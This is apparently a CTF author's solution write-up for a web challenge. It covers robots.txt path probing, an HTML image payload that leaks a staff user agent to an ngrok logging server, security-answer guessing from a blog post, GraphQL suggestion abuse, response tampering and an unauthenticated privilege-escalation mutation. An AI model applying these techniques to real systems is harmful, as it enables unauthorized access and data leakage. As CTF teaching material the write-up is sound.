# E-CORP CTF - 1337UP LIVE CTF 2023 - Intigrity

The following is the “intended solution” for my CTF challenge.

## Intro
We got some hints from the ctf description:
1. **Hint 1:** The dashboard is on the clearnet. They probably don't want it to be indexed by search engines though.  First thing that comes to mind is the robots meta and robots.txt
2. **Hint 2:** They are migrating back-end architecture, which if done hastly, is recipe for bugs and forgotten endpoints that might circumvent new protections or business logic.

## Finding the Dashboard
As mentioned, one of the ways to check for hidden paths without having to start using crawlers is to just check the robots.txt.
In this case, we find an ugly sight.

![robots.txt](./images/robots.png)

The file is filled with seemingly random paths, probably in an attempt to conceal the actual dashboard. But of course, that is futile.
There are many ways to check which ones of those paths work and which don't. Let's take the most obvious choices, the ones that start with c2, dashboard or contain "login".
We can first try a couple of them manually. /c2, /dashboard and /login all give 404.
Given that we can test for the 404, let's try writing a quick script to weed out the 404s
```python
#!/bin/env python3

import urllib.request
from urllib.parse import urljoin

def extract_paths(base_url):
    robots_url = urljoin(base_url, 'robots.txt')
    try:
        with urllib.request.urlopen(robots_url) as response:
            robots_txt = response.read().decode('utf-8')
            paths = [line.split(': ', 1)[1].strip() for line in robots_txt.splitlines() if line.startswith('Disallow')]
            return paths
    except urllib.error.HTTPError as e:
        print(f"Error retrieving robots.txt: {e}")
        return []

def test_paths(base_url, paths):
    for path in paths:
        full_url = urljoin(base_url, path)
        try:
            with urllib.request.urlopen(full_url) as response:
                if response.getcode() != 404:
                    print(f"Non-404 response for path: {full_url}")
        except urllib.error.HTTPError as e:
            if e.code != 404:
                print(f"Error for path {full_url}: {e}")

if __name__ == "__main__":
    base_url = "https://ecorp.ctf.intigriti.io/"
    paths = extract_paths(base_url)
    test_paths(base_url, paths)
```

All the results seem to start with /c2/panel. This is probably the base path for the dashboard.
Trying to access the page will result in a "Unrecognized device" error. We need to find out what is the correct device.
Let's go check out the other pages and see what we can find out.

## Sensitive information
I like cats. So, when going on the blog section i immediately go read the one about felines. The author seems sweet, but she has written way too much information about her.
Reading through the whole blog post we can see that:
1. She is a female.
2. She is obsessed by cats.
3. She works as sales.
This is useful information for an attacker in a social engineering scenario for sure, but it will also be for us in this case.

## Spoofing the user agent
The staff team most likely will use their neurotap to read their messages / emails. Let's try to check for XSS on the contact-us form.
Let's set up a simple webserver and tunnel with ngrok.
```python
#!/usr/bin/env python3

import http.server as SimpleHTTPServer
import socketserver as SocketServer
import logging

PORT = 3333

class GetHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        logging.error(self.headers)
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)


Handler = GetHandler
httpd = SocketServer.TCPServer(("", PORT), Handler)

print("serving on port", PORT)
httpd.serve_forever()
```

We'll be sending the following payload:
```html
<body><img src='https://1c4c-77-32-33-199.ngrok-free.app/image.jpg'/></body>
```
We won't be able to see the console.log but you never know.
We know that the cat lady is working as Sales. In a real scenario we would lure her into clicking on something cat related. Here, we can omit that and just send the payload as it is.

This is what we get:
```
ERROR:root:Host: 1c4c-77-32-33-199.ngrok-free.app
User-Agent: NEUROTAP-v0.2-BEG!---32FM19790306873AEB!---
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
X-Forwarded-For: 35.233.50.225
X-Forwarded-Host: 1c4c-77-32-33-199.ngrok-free.app
X-Forwarded-Proto: https


127.0.0.1 - - [19/Nov/2023 15:27:45] code 404, message File not found
127.0.0.1 - - [19/Nov/2023 15:27:45] "GET /image.jpg HTTP/1.1" 404 -
```

## Spoofing User Agent
That user-agent looks like our key. Let's use it. On chrome i'd use the Network Conditions tab. On firefox i just use [this extension.](https://add0n.com/useragent-switcher.html).

Going back to /c2/panel, we are greeted with what seems to be a login page. Of course we don't have a neurotap on us, so we won't be logging in as they want us to.

Let's start checking out which requests are sent when the page is first loaded.
We have a post request to api/graphql. Hmmmm this gives me a hunch that they might be using graphql, not sure.
This is the request body:
```json
{"query":"\n    query gsu($id: String!) {\n        getStaffUser(id: $id) {\n            id\n            level\n            securityQuestion\n            username\n        }\n    }\n","variables":{"id":"32FM19790306873AEB"},"operationName":"gsu"}
```
and this is the response:
```json
{"data":{"getStaffUser":{"id":"32FM19790306873AEB,"level":1,"securityQuestion":"What is your favorite animal?","username":"Marilie_Ruecker"}}}
```

Yeah, i think they are using graphql.
Let's check out the source code and see what we can find.

![source code](./images/source1.png)

They seem to be using nextjs in a production build, which means that the source is going to be split into many chunks. 
Let's start with the one that looks it might be the most useful: _next/static/chunks/app/(c2)/c2/panel/login/page-(uuid).js and pretty-print it.

Right away we can find all the graphql mutations and queries. That was easy. Let's keep scrolling and see if there's anything else interesting.
```ts
(0, r.jsx) (
                p.Z,
                {
                  className: 'fixed left-12 top-6 max-w-[5rem]',
                  theme: 'light',
                  size: 'sm',
                  onClick: () => {
                    let e = prompt('Enter password') ||
                    '',
                    t = (0, j.W) (window.navigator.userAgent);
                    d.mutate({
                      p: e,
                      i: t
                    }),
                    n.push('/c2/panel/dashboard')
                  },
                  children: 'TEST LOGIN'
                }
              ),
```
Looks like there's some debug code in here. Apparently once logged in, we should check out /c2/panel/dashboard.
```ts
2490: function (e, t, n) {
      'use strict';
      function extractIdFromUserAgent(e) {
        let t = new RegExp(/^NEUROTAP-v0\.2-BEG!---(.*\d+.*)!---$/),
        n = t.exec(e);
        return n ? n[1] : e
      }
      n.d(t, {
        W: function () {
          return extractIdFromUserAgent
        }
      }),
      n(553)
```
Looks like the ID is going to be whatever is between the --- in the user agent.
Let's try out the login mutation and see what happens. We could use InQL on Burp Suite, but for this challenge we can just use the Edit & Resend functionality in the firefox network dev tools.
Since i'm lazy, i'm going to just reuse the initial graphql request that is sent when the page is loaded:
```json
{"query":"\n    query gsu($id: String!) {\n        getStaffUser(id: $id) {\n            id\n            level\n            securityQuestion\n            username\n        }\n    }\n","variables":{"id":"32FM19790306873AEB"},"operationName":"gsu"}
```
I'm going to change it to the oldLogin mutation we found, replacing the variable `id` with `i` and the operation name from `gsu` to `l`.
Considering that this person really likes cats and the question is "Which is your favorite animal", we can make educated guesses and try either "cat" or "cats".
```json
{"query":"\n    mutation l($p: String!, $i: String!) {\n        oldLogin(p: $p, i: $i) {\n            id\n        }\n    }\n","variables":{"i":"32FM19790306873AEB", "p": "cat"},"operationName":"l"}
```
Here's what we get:
```
	{
		"message": "Cannot query field \"oldLogin\" on type \"Mutation\". Did you mean \"c2Login\"?",
		"locations": [
			{
				"line": 3,
				"column": 9
			}
		],
		"extensions": {
			"code": "GRAPHQL_VALIDATION_FAILED"
		}
	}
}
```
They seem to have forgot to disable error suggestions. Great. Well, i guess  we're going to try c2Login instead of oldLogin.
We get a response with the victim data in it, but most importantly, the cookie to log in.
set-cookie: t=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIzMkZNTk3OTAzMDY4NzNBRUIiLCJsZXZlbCI6MSwiaWIjoxNzAwNDY3ODA5LCJleHAiOjE3MDA0NzE0MDl9.XIqu9_rGMmKhwqwtoKA_C8HFmb50CiRlIA13PAE; Max-Age=3600000; Path=/;

## Accessing the Dashboard

Once set the cookie, we can finally access the c2 panel by going to the /c2/panel/dashboard page.
It looks like it is heavily WIP like most of their stuff. We don't seem to be able to input anything. 
There is an interesting piece of information in the News panel. It says: "Level 0 panel is WIP with ETA Q4"...
Considering that our access level seems to be 1, the level 0 could be higher privilege. There is also not much else to look for anyway.

## Escalating privilege
We can again inspect the source code and the network tab.
Again, let's start with the most relevant chunk: _next/static/chunks/app/(c2)/c2/panel/dashboard/page-(uuid).js and pretty-print it.
In the source code, searching for "level" shows us that it is indeed being used for some checks,  most notably:
```ts
        [
          C,
          S
        ] = (0, l.useState) (
          (
            null == r ? void 0 : null === (t = r.getStaffUser) ||
            void 0 === t ? void 0 : t.level
          ) === 0
        ),
        //...
        [
          z,
          G
        ] = (0, l.useState) (!1),
        panic = async() => {
          try {
            let e = await fetch(
              '/api/v1/dev/panic',
              {
                method: 'POST',
                credentials: 'same-origin',
                mode: 'same-origin',
                cache: 'no-cache',
                referrerPolicy: 'origin',
                headers: {
                  'Content-Type': 'application/json',
                  Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                  'Accept-Language': 'en-US,en;q=0.5',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Upgrade-Insecure-Requests': '1',
                  'Sec-Fetch-Dest': 'document',
                  'Sec-Fetch-Mode': 'navigate',
                  'Sec-Fetch-Site': 'same-origin'
                }
              }
            ),
            t = await e.json();
            t.length > 1 &&
            G(!0)
          } catch (e) {
            console.log(e)
          }
        };
        //...
                 C &&
                    (0, a.jsx) (
                      SymmetricPanel,
                      {
                        title: 'GLOBAL ADMIN PANEL (WIP)',
                        className: 'mb-8 h-auto w-max px-3 pb-4',
                        children: (0, a.jsxs) (
                          'div',
                          {
        // ... and finally
        let e = (0, a._) (
          ['\n    mutation s($i: String!, $l: Int!) {\n        _devSetLevel(i: $i, l: $l) {\n            id\n            level\n            username\n        }\n    }\n']
        );
```

So, the first piece of code seems to be a useState. It seems to be checking for the `level` property on the r.getStaffUser property.
The minified code is very hard to understand, but one thing is for sure, we know from the [react docs](https://react.dev/reference/react/useState) that useState returns an array containing a value and a setter.
```ts
const [state, setState] = useState(initialState);
```
So, state in this case is going to be the variable C. And look at that, it's used as a condition right before the 'GLOBAL ADMIN PANEL(WIP)'.

We also have an `async panic` function sending a POST to /api/v1/dev/panic.
Copy-pasting the request in the console.log gives us a 403. Sounds like we don't have permissions to hit that endpoint.

In the network tab, we can try to intercept the response of the post to api/graphql, which seems to return the staff member's data along with its level.
Once intercepted, we can change the level from 1 to 0 and see what happens.

![burp suite intercept response](./images/burp1.png)

![admin panel](./images/adminpanel.png)
And there we go, we the admin panel is rendered. There is also the panic button, which if clicked, just sends the request we already tried.
There seems to also be a SET LVL button. Which is also a graphql mutation we found in the source code.
Clicking on SET LVL it asks us for the ID (which remember, is only the part in between the --- of our user agent, so 32FM19790306873AEB) and the new level to set (0).
In the network tab we can see that the request actually went through and gave us a new cookie, so they probably missed checking for authentication on the backend for this endpoint.
Clicking on panic, and this time we get a 200, with our flag.


This was my first time creating a CTF, and as expected, it didn't go down super well, but i learned a lot of things, and i hope it taught you something about real world testing scenarios: if there's an architecture overhaul, you can be damn sure some bugs are going to pop out. 
Also, oversharing is never a good idea, especially on a blogpost of a vulnerable website :P.

I hope you liked my scuffed ctf at least a bit and had a nice time at the event.

